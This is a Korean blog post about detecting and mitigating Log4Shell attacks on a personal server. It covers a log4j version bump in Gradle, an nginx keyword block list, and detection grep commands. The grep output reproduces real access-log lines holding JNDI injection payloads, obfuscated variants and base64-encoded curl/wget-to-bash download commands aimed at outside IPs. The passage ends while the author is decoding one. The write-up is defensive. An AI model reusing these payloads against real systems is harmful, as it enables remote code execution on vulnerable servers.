3-3.5S14.5 6 13 6z\"></path></svg></a>어떻게 공격이 들어오는가?</h2>\n<p>일단 불법적으로 들어오는 것들을 조사하는 로그 서버에서 이런 결과가 들어있었다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 1.6666666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAYAAADeko4lAAAACXBIWXMAAAsTAAALEwEAmpwYAAAARElEQVQI1x2IwQ2AMAzEGCmKRJ80uYTSgth/nEPkYVn2dq2HyEGPZDfQPKoNwaMbc0w6koizfnfU+5n3y701ighVtfwBiwIi+pWP7aMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/769b261384b168f466560382be26ccd4/7c297/img_01.webp 180w,\n/static/769b261384b168f466560382be26ccd4/33ecc/img_01.webp 360w,\n/static/769b261384b168f466560382be26ccd4/df77d/img_01.webp 720w,\n/static/769b261384b168f466560382be26ccd4/5c666/img_01.webp 1080w,\n/static/769b261384b168f466560382be26ccd4/b3358/img_01.webp 1301w\"\n              sizes=\"(max-width: 720px) 100vw, 720px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/769b261384b168f466560382be26ccd4/e9ea2/img_01.png 180w,\n/static/769b261384b168f466560382be26ccd4/53918/img_01.png 360w,\n/static/769b261384b168f466560382be26ccd4/242a6/img_01.png 720w,\n/static/769b261384b168f466560382be26ccd4/b4ad3/img_01.png 1080w,\n/static/769b261384b168f466560382be26ccd4/14a3e/img_01.png 1301w\"\n            sizes=\"(max-width: 720px) 100vw, 720px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/769b261384b168f466560382be26ccd4/242a6/img_01.png\"\n            alt=\"img 01\"\n            title=\"img 01\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span>\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 1.6666666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAYAAADeko4lAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAP0lEQVQI1z2KyQ3AMAzDupKN5ulLdvcfSUFToC+BpC7zYFYzMWctklFg9fBt5h975O/OF83CEPPwXosiQlXlBnDKIpUpX1xwAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/aec2f20ca53fea94b29439398a0b85e9/7c297/img_02.webp 180w,\n/static/aec2f20ca53fea94b29439398a0b85e9/33ecc/img_02.webp 360w,\n/static/aec2f20ca53fea94b29439398a0b85e9/df77d/img_02.webp 720w,\n/static/aec2f20ca53fea94b29439398a0b85e9/5c666/img_02.webp 1080w,\n/static/aec2f20ca53fea94b29439398a0b85e9/95f20/img_02.webp 1440w,\n/static/aec2f20ca53fea94b29439398a0b85e9/aa71c/img_02.webp 1532w\"\n              sizes=\"(max-width: 720px) 100vw, 720px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/aec2f20ca53fea94b29439398a0b85e9/e9ea2/img_02.png 180w,\n/static/aec2f20ca53fea94b29439398a0b85e9/53918/img_02.png 360w,\n/static/aec2f20ca53fea94b29439398a0b85e9/242a6/img_02.png 720w,\n/static/aec2f20ca53fea94b29439398a0b85e9/b4ad3/img_02.png 1080w,\n/static/aec2f20ca53fea94b29439398a0b85e9/89066/img_02.png 1440w,\n/static/aec2f20ca53fea94b29439398a0b85e9/b5cb9/img_02.png 1532w\"\n            sizes=\"(max-width: 720px) 100vw, 720px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/aec2f20ca53fea94b29439398a0b85e9/242a6/img_02.png\"\n            alt=\"img 02\"\n            title=\"img 02\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>동작 방식은 사실 대충 알고, 자세하게 동작하는 방식은 <strong><a href=\"https://www.popit.kr/log4j-%EB%B3%B4%EC%95%88-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%8F%99%EC%9E%91%EC%9B%90%EB%A6%AC-%EB%B0%8F-jenkins-%EC%84%9C%EB%B2%84-%ED%99%95%EC%9D%B8-%EB%B0%A9%EB%B2%95/\">popit</a></strong> 게시글을 참고하자.<br>\n(여담인데 난 원리까진 모르고 어떻게만 공격해서 들어오는지 까지만 알기에… 공격 기법이나 원리에 대한 설명은 무지해서 적을 수 없다…)</p>\n<p>내가 이해한 바로는 log.info 나 log.warn() 등을 통해 로깅을 할 때 메세지에 다음과 같이 적을 때 발생한다.</p>\n<blockquote>\n<p>log.error(“Req Access UA : ” + req.getHeader(“X-Api-Version”) );</p>\n</blockquote>\n<p>위는 예시이다.<br>\n저런식으로 로그를 남기게 해서 공격자의 코드를 수행할 수 있게 한다는거 같다</p>\n<blockquote>\n<p>jandi:ldap://공격자-ip/http443path</p>\n</blockquote>\n<p>위 사진을 보면 알겠지만 저렇게 ldap 뒤에 공격자의 주소를 넣어서 처리하는 식으로 들어온다.</p>\n<br>\n<h2 id=\"그래서-어떻게-처리했는가\" style=\"position:relative;\"><a href=\"#%EA%B7%B8%EB%9E%98%EC%84%9C-%EC%96%B4%EB%96%BB%EA%B2%8C-%EC%B2%98%EB%A6%AC%ED%96%88%EB%8A%94%EA%B0%80\" aria-label=\"그래서 어떻게 처리했는가 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>그래서 어떻게 처리했는가?</h2>\n<p>뭐 별거 없다.<br>\n그냥 log4j 버전업을 했다.<br>\n사진을 못찍었는데 나의 경우 spring boot starter 의 logging 이었나 이게 2.11 버전을 쓰고 있었다.</p>\n<p>그래서 그냥 버전을 올렸다.<br>\n<strong>Gradle</strong> 을 사용하는데 아래와 같이 한줄 넣어줬다.</p>\n<div class=\"gatsby-highlight\" data-language=\"gradle\"><pre class=\"language-gradle\"><code class=\"language-gradle\"><span class=\"token punctuation\">...</span>\next<span class=\"token punctuation\">[</span><span class=\"token string\">'log4j2.version'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'2.15.0'</span>\n\n<span class=\"token keyword\">dependencies</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token punctuation\">....</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">....</span></code></pre></div>\n<p>위와 같이 한줄 넣고 gradle을 새로 받아오니 log4j의 버전이 2.15로 되었다.<br>\n이렇게 대응이 완료되었다… ㅡ,.ㅡ;;</p>\n<p>그리고…이건 공격 대응이 될지 모르겠지만…<br>\nnginx 앞단에서 특정 키워드로 접근하는 것을 막는 부분에 다음과 같이 추가해줬다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">...\n\t~*(j_spring_security_check|wps|cgi|asmx|jndi|dns|securityscan|ldap) 1;\n...</code></pre></div>\n<p>이렇게 하면 서비스 접근 전에 nginx에서 컷 시킬수 있지 않을까 싶다. (안될수도?)<br>\n근데 이렇게 하니 로그 서버에 저런 비 정상적인 접근은 더 이상 들어오지 않았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 563px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAfklEQVQI132OSw7DIAxEc6PwUwk0AYwJae9/oKnsTaSq6mIWnhk/ezlKhXMO1tofctiPgj4mWmc0YvW99xjzhVIJj7jBGANjVs2W/0B7A4lRiXVZgK0P8HlhzDdKbdpToAxSEOi3xJeDnU8FNurqhxD0w5QyYtyQnztSzpp9AJ5ZYz0Ui31oAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/4225f2521cd918169f91b37e67f46deb/7c297/img_03.webp 180w,\n/static/4225f2521cd918169f91b37e67f46deb/33ecc/img_03.webp 360w,\n/static/4225f2521cd918169f91b37e67f46deb/1b3b6/img_03.webp 563w\"\n              sizes=\"(max-width: 563px) 100vw, 563px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/4225f2521cd918169f91b37e67f46deb/e9ea2/img_03.png 180w,\n/static/4225f2521cd918169f91b37e67f46deb/53918/img_03.png 360w,\n/static/4225f2521cd918169f91b37e67f46deb/e80ce/img_03.png 563w\"\n            sizes=\"(max-width: 563px) 100vw, 563px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/4225f2521cd918169f91b37e67f46deb/e80ce/img_03.png\"\n            alt=\"img 03\"\n            title=\"img 03\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>단지 위와 같이 무지성으로 대입해서 들어오는 것들이 많을 뿐…</p>\n<p>그리고 하단의 참고 항목을 보면 Cisco talos 차단 권고 항목에 ip가 있다.<br>\n여기에 등록된 ip 전부 밴 처리 해뒀다.</p>\n<br>\n<h2 id=\"정리-및-참고-그리고-부록\" style=\"position:relative;\"><a href=\"#%EC%A0%95%EB%A6%AC-%EB%B0%8F-%EC%B0%B8%EA%B3%A0-%EA%B7%B8%EB%A6%AC%EA%B3%A0-%EB%B6%80%EB%A1%9D\" aria-label=\"정리 및 참고 그리고 부록 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>정리 및 참고 그리고 부록…</h2>\n<h3 id=\"정리\" style=\"position:relative;\"><a href=\"#%EC%A0%95%EB%A6%AC\" aria-label=\"정리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>정리</h3>\n<p>근데 개인적인 생각인데 User Agent 를 로깅 안하면 영향은 없지 않을까? (개인적 무지성 판단…)<br>\n얼른 대응해서 큰 피해 안나게 조심하자…</p>\n<br>\n<h3 id=\"참고\" style=\"position:relative;\"><a href=\"#%EC%B0%B8%EA%B3%A0\" aria-label=\"참고 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>참고</h3>\n<p><a href=\"https://labrador.iotcube.com\">래브라도 취약점 점검 도구-한글</a><br>\n<a href=\"https://blog.lgcns.com/2740\">LG CNS의 차단 대응 및 안내 -한글</a><br>\n<a href=\"https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot\">Spring 공식 레퍼런스 대응 -영문</a><br>\n<a href=\"https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b\">Log4J 악용탐지-영문</a><br>\n<a href=\"https://blog.talosintelligence.com/2021/12/apache-log4j-rce-vulnerability.html\">Cisco talos 차단 권고-영문</a></p>\n<br>\n<h3 id=\"부록---악용탐지\" style=\"position:relative;\"><a href=\"#%EB%B6%80%EB%A1%9D---%EC%95%85%EC%9A%A9%ED%83%90%EC%A7%80\" aria-label=\"부록   악용탐지 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>부록 - 악용탐지</h3>\n<p>위의 참고 중에 악용 탐지 gist 항목을 보면…<br>\n<strong>/var/log 폴더 및 모든 하위 폴더의 압축되지 않은 파일에서 악용 시도</strong> 에 대한 검색을 할 수 있는 grep 명령어를 제공한다.</p>\n<p>한번 돌려봤다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">fuck-hack@ip-999-444-999-444:~$ sudo egrep -I -i -r '\\$(\\{|%7B)jndi:(ldap[s]?|rmi|dns|nis|iiop|corba|nds|http):/[^\\n]+' /var/log\n/var/log/nginx/access.log.1:51.89.237.81 - - [13/Dec/2021:04:28:09 +0900] \"GET /$%7Bjndi:ldap://79.172.214.11:1389/Basic/Command/Base64/Y3VybCAxMzUuMTI1LjIxNy44Ny9qbmRpLnNoIHwgYmFzaA==%7D HTTP/1.0\" 404 162 \"-\" \"mozila\"\n/var/log/nginx/access.log.1:45.83.67.182 - - [13/Dec/2021:12:37:28 +0900] \"GET /$%7Bjndi:dns://45.83.64.1/securityscan-http80%7D HTTP/1.1\" 404 134 \"${jndi:dns://45.83.64.1/securityscan-http80}\" \"${jndi:dns://45.83.64.1/securityscan-http80}\"\n/var/log/nginx/access.log.1:45.83.66.117 - - [13/Dec/2021:12:51:02 +0900] \"GET /$%7Bjndi:dns://45.83.64.1/securityscan-https443%7D HTTP/1.1\" 302 0 \"${jndi:dns://45.83.64.1/securityscan-https443}\" \"${jndi:dns://45.83.64.1/securityscan-https443}\"\n/var/log/nginx/access.log.1:45.83.66.117 - - [13/Dec/2021:12:51:02 +0900] \"GET / HTTP/1.1\" 200 7587 \"${jndi:dns://45.83.64.1/securityscan-https443}\" \"${jndi:dns://45.83.64.1/securityscan-https443}\"\n/var/log/nginx/access.log.1:195.54.160.149 - - [13/Dec/2021:13:45:17 +0900] \"GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo} HTTP/1.1\" 200 396 \"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo}\" \"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo}\"\n/var/log/nginx/access.log.1:167.172.44.255 - - [13/Dec/2021:20:45:05 +0900] \"GET / HTTP/1.0\" 200 612 \"-\" \"borchuk/3.1 ${jndi:ldap://167.172.44.255:389/LegitimateJavaClass}\"\n\n=====\n\nfuck-hack@ip-999-444-999-444:~$ sudo find /var/log -name \\*.gz -print0 | xargs -0 zgrep -E -i '\\$(\\{|%7B)jndi:(ldap[s]?|rmi|dns|nis|iiop|corba|nds|http):/[^\\n]+'\n/var/log/nginx/access.log.3.gz:45.155.205.233 - - [11/Dec/2021:03:21:49 +0900] \"GET / HTTP/1.1\" 200 396 \"-\" \"${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDQ1LjE1NS4yMDUuMjMzOjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo}\"\n/var/log/nginx/access.log.3.gz:1.116.59.211 - - [11/Dec/2021:19:13:15 +0900] \"GET /${jndi:ldap://45.130.229.168:1389/Exploit} HTTP/1.1\" 404 162 \"-\" \"curl/7.58.0\"\n/var/log/nginx/access.log.3.gz:195.251.41.139 - - [11/Dec/2021:21:13:15 +0900] \"GET / HTTP/1.1\" 200 396 \"-\" \"/${jndi:ldap://45.130.229.168:1389/Exploit}\"\n/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:02:26:12 +0900] \"GET / HTTP/1.1\" 200 7417 \"-\" \"${jndi:ldap://http443useragent.kryptoslogic-cve-2021-44228.com/http443useragent}\"\n/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:04:03:54 +0900] \"GET /$%7Bjndi:ldap://http443path.kryptoslogic-cve-2021-44228.com/http443path%7D HTTP/1.1\" 302 0 \"-\" \"Kryptos Logic Telltale\"\n/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:04:03:54 +0900] \"GET / HTTP/1.1\" 200 7418 \"https://3.36.159.204/$%7Bjndi:ldap://http443path.kryptoslogic-cve-2021-44228.com/http443path%7D\" \"Kryptos Logic Telltale\"\n/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:08:26:47 +0900] \"GET / HTTP/1.1\" 200 396 \"-\" \"${jndi:ldap://http80useragent.kryptoslogic-cve-2021-44228.com/http80useragent}\"\n/var/log/nginx/access.log.2.gz:138.197.9.239 - - [12/Dec/2021:09:42:21 +0900] \"GET /$%7Bjndi:ldap://http80path.kryptoslogic-cve-2021-44228.com/http80path%7D HTTP/1.1\" 404 134 \"-\" \"Kryptos Logic Telltale\"\n/var/log/nginx/access.log.2.gz:45.155.204.20 - - [12/Dec/2021:10:01:33 +0900] \"GET /?x=${jndi:ldap://${hostName}.c6qjl3i5aulm7bb8ice0cg4wu5eyyek46.interactsh.com/a} HTTP/1.1\" 400 800 \"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6qjl3i5aulm7bb8ice0cg4wu5eyyek46.interactsh.com}\" \"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.c6qjl3i5aulm7bb8ice0cg4wu5eyyek46.interactsh.com}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:02:36:55 +0900] \"POST /?&amp;token=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;sign=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;username=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;password=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;error=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;apikey=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D&amp;key=$%7Bjndi:rmi://iswqeua.q.i.yunzhanghu.co:443/abc%7D HTTP/1.1\" 405 0 \"-\" \"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:12 +0900] \"POST /api?&amp;token=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;sign=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;username=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;password=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;error=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;apikey=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;key=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D HTTP/1.1\" 302 0 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:12 +0900] \"GET / HTTP/1.1\" 200 7637 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:12 +0900] \"GET /api?&amp;token=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;sign=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;username=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;password=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;error=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;apikey=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;key=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D HTTP/1.1\" 302 0 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:13 +0900] \"GET / HTTP/1.1\" 200 7635 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:13 +0900] \"PUT /api?&amp;token=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;sign=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;username=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;password=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;error=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;apikey=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D&amp;key=$%7Bjndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc%7D HTTP/1.1\" 302 0 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:114.254.20.186 - - [10/Dec/2021:04:17:13 +0900] \"GET / HTTP/1.1\" 200 7635 \"-\" \"${jndi:rmi://joavsim.r.i.yunzhanghu.co:443/abc}\"\n/var/log/nginx/access.log.4.gz:45.155.205.233 - - [10/Dec/2021:22:31:20 +0900] \"GET / HTTP/1.1\" 200 396 \"-\" \"${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDQ1LjE1NS4yMDUuMjMzOjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo}\"\n/var/log/nginx/access.log.4.gz:45.155.205.233 - - [10/Dec/2021:23:27:05 +0900] \"GET / HTTP/1.1\" 200 7669 \"-\" \"${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8zLjM2LjE1OS4yMDQ6NDQzfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzMuMzYuMTU5LjIwNDo0NDMpfGJhc2g=}\"\n\n====\n\nfuck-hack@ip-999-444-999-444:~$ sudo find /var/log/ -type f -exec sh -c \"cat {} | sed -e 's/\\${lower://'g | tr -d '}' | egrep -I -i 'jndi:(ldap[s]?|rmi|dns|nis|iiop|corba|nds|http):'\" \\;\n51.89.237.81 - - [13/Dec/2021:04:28:09 +0900] \"GET /$%7Bjndi:ldap://79.172.214.11:1389/Basic/Command/Base64/Y3VybCAxMzUuMTI1LjIxNy44Ny9qbmRpLnNoIHwgYmFzaA==%7D HTTP/1.0\" 404 162 \"-\" \"mozila\"\n45.83.67.182 - - [13/Dec/2021:12:37:28 +0900] \"GET /$%7Bjndi:dns://45.83.64.1/securityscan-http80%7D HTTP/1.1\" 404 134 \"${jndi:dns://45.83.64.1/securityscan-http80\" \"${jndi:dns://45.83.64.1/securityscan-http80\"\n45.83.66.117 - - [13/Dec/2021:12:51:02 +0900] \"GET /$%7Bjndi:dns://45.83.64.1/securityscan-https443%7D HTTP/1.1\" 302 0 \"${jndi:dns://45.83.64.1/securityscan-https443\" \"${jndi:dns://45.83.64.1/securityscan-https443\"\n45.83.66.117 - - [13/Dec/2021:12:51:02 +0900] \"GET / HTTP/1.1\" 200 7587 \"${jndi:dns://45.83.64.1/securityscan-https443\" \"${jndi:dns://45.83.64.1/securityscan-https443\"\n195.54.160.149 - - [13/Dec/2021:13:45:17 +0900] \"GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo HTTP/1.1\" 200 396 \"${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo\" \"${${::-j${::-n${::-d${::-i:${::-l${::-d${::-a${::-p://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo\"\n167.172.44.255 - - [13/Dec/2021:20:45:05 +0900] \"GET / HTTP/1.0\" 200 612 \"-\" \"borchuk/3.1 ${jndi:ldap://167.172.44.255:389/LegitimateJavaClas</code></pre></div>\n<p>저기서 base64로 인코딩된 부분을 풀어보니</p>\n<blockquote>\n<p>(curl -s 195.54.160.149:5874/3.36.159.204:80||wget -q -O- 